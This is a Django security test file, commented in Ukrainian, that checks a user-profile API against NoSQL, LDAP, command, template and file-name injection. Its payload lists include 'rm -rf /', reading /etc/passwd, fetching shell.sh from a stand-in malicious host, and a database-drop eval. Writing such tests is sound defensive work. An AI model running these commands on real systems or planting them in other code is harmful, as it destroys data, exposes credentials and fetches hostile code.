import json
from django.test import TestCase, Client
from django.contrib.auth import get_user_model
from unittest.mock import patch

User = get_user_model()


class InjectionSecurityTest(TestCase):
    """Тести захисту від injection атак"""

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            email='injection@example.com',
            password='Injection123!',
            is_verified_email=True,
            is_active=True
        )
        self.client.force_login(self.user)

    def test_nosql_injection_protection(self):
        """Тест захисту від NoSQL injection"""
        nosql_payloads = [
            {'$ne': None},
            {'$gt': ''},
            {'$regex': '.*'},
            {'$where': 'function() { return true; }'},
            {'$eval': 'db.users.drop()'},
        ]

        for payload in nosql_payloads:
            data = {
                'user': {'email': payload}
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            # NoSQL injection повинні блокуватись
            self.assertEqual(response.status_code, 400)

    def test_ldap_injection_protection(self):
        """Тест захисту від LDAP injection"""
        ldap_payloads = [
            'admin)(|(password=*))',
            'admin)(&(password=*))',
            '*)(uid=*',
            '*)((|',
            ')(|(objectClass=*)',
        ]

        for payload in ldap_payloads:
            data = {
                'user': {'name': payload}
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            # Перевірка що LDAP спеціальні символи оброблені
            self.assertEqual(response.status_code, 200)

            # Перевірка що дані sanitized
            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            name = profile_data['user']['name']

            # LDAP спеціальні символи повинні бути екрановані
            ldap_special_chars = ['(', ')', '|', '&', '*']
            for char in ldap_special_chars:
                if char in payload:
                    self.assertNotIn(char, name, f"LDAP char {char} not escaped")

    def test_command_injection_protection(self):
        """Тест захисту від command injection"""
        command_payloads = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '&& wget malicious.com/shell.sh',
            '`id`',
            '$(whoami)',
            '; DROP DATABASE users; --',
            '|| ping -c 10 attacker.com',
        ]

        for payload in command_payloads:
            data = {
                'profile': {'bio': payload}
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 200)

            # Перевірка що команди не виконались
            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            bio = profile_data.get('profile', {}).get('bio', '')

            # Командні символи повинні бути sanitized
            dangerous_chars = [';', '|', '&', '`', '$']
            for char in dangerous_chars:
                if char in payload:
                    self.assertNotIn(char, bio, f"Command char {char} not sanitized")

    def test_template_injection_protection(self):
        """Тест захисту від template injection"""
        template_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            '{{config.items()}}',
            '{{ "".class.mro[2].subclasses() }}',
            '{%for i in range(10)%}{{i}}{%endfor%}',
        ]

        for payload in template_payloads:
            data = {
                'profile': {'bio': payload}
            }

            response = self.client.patch(
                '/api/user/profile/',
                data=json.dumps(data),
                content_type='application/json'
            )

            self.assertEqual(response.status_code, 200)

            # Перевірка що template код не виконався
            response = self.client.get('/api/user/profile/')
            profile_data = response.json()
            bio = profile_data.get('profile', {}).get('bio', '')

            # Template expressions не повинні виконуватись
            self.assertNotIn('49', bio)  # 7*7 = 49
            self.assertNotIn('0123456789', bio)  # range(10)

    @patch('subprocess.run')
    def test_system_command_injection(self, mock_subprocess):
        """Тест захисту від виконання системних команд"""
        # Симуляція payload що може викликати системні команди
        dangerous_filename = "test.jpg; rm -rf /"

        from django.core.files.uploadedfile import SimpleUploadedFile

        malicious_file = SimpleUploadedFile(
            dangerous_filename,
            b"fake image content",
            content_type="image/jpeg"
        )

        response = self.client.post(
            '/api/user/profile/',
            {'profile_picture': malicious_file}
        )

        # Файл з небезпечним ім'ям повинен блокуватись
        self.assertEqual(response.status_code, 400)

        # Системні команди не повинні викликатись
        mock_subprocess.assert_not_called()
